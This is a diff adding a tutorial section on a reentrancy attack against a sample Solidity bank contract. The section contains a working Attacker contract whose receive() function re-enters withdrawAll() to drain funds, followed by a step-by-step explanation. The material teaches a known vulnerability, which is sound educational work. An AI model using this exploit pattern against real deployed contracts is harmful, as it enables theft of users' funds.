@@ -30,3 +30,47 @@ contract EOABank {
 ```
 
 What this contract does is simple. It accepts payments through the `deposit()` function and allows withdrawal of all funds with the `withdrawAll()` function.
+
+## How can this EOABank contract be attacked?
+
+Consider this **Attacker** contract:
+
+```solidity
+contract Attacker {
+
+    EOABank public exploitBank;
+
+    constructor(address _thebankAddress) {
+        exploitBank = EOABank(_thebankAddress);
+    }
+
+    // fallback
+    receive() external payable {
+        if (address(exploitBank).balance >= 1 ether) {
+            exploitBank.withdrawAll();
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        // send 1 Ether
+        exploitBank.deposit{value: 1 ether}();
+        // immediately withdraw
+        exploitBank.withdrawAll();
+    }
+
+}
+```
+
+This contract expects the address of the **EOABank** contract at deployment. It also overwrites the `receive()` function (usually a fallback function in every smart contract) with its own functionality. The `attack()` function is where **EOABank** is attacked.
+
+Let's go through the steps of this attack in more detail:
+![](/images/reentrancy.png)
+
+1. The Attacker contract deposits 1 Ether at **EOABank**.
+2. The funds are immediately withdrawn.
+3. The withdrawal triggers the `receive()` function. This happens before `balances` is set to 0.
+4. The `receive()` function allows execution of arbitrary code. The Attacker uses this to call `withdrawAll()` again.
+5. Here the loop starts between `receive()` and `withdrawAll()` until all funds are drained.
+6. The loop.
+7. Only after all funds are drained, `balances` is set to 0.
